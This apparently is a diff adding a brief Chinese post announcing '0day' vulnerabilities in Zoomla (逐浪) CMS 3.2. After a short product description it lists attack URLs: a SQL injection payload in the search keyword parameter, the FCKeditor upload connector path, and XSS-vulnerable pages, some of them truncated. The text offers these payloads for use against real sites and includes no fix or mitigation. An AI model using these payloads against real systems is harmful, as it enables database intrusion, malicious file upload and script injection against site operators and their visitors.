@@ -1,0 +1,17 @@
+逐浪CMS3.2 0day漏洞发布
+
+[逐浪CMS3.2 0day漏洞发布 全文]Zoomla!逐浪CMS是功能强大的网站内核与管理系统,集成内容管理\OA\SNS\项目管理\采集\邮件订阅等强大功能,基于c#语言.net架构开发,是目前中国唯一同步支持MSSQL与Oracle两大数据库的高端CMS,用于快速构建高效门户网站
+
+测试方法：
+
+1.注入漏洞：
+
+http://www.site.com/Search/Searc ... =0&keyword=1%25()=0%20oR%20''%25''=''&type=1
+
+2.FCKeditor上传漏洞
+http://www.site.com/editor/filem ... px%2Fconnector.aspx
+
+3.XSS脚本跨站漏洞
+http://www.sitedir.com.cn/prompt/correct.aspx?t= 
+
+http://www.sitedir.com.cn/Search/Searc ... ype=1&keyword=1ay 
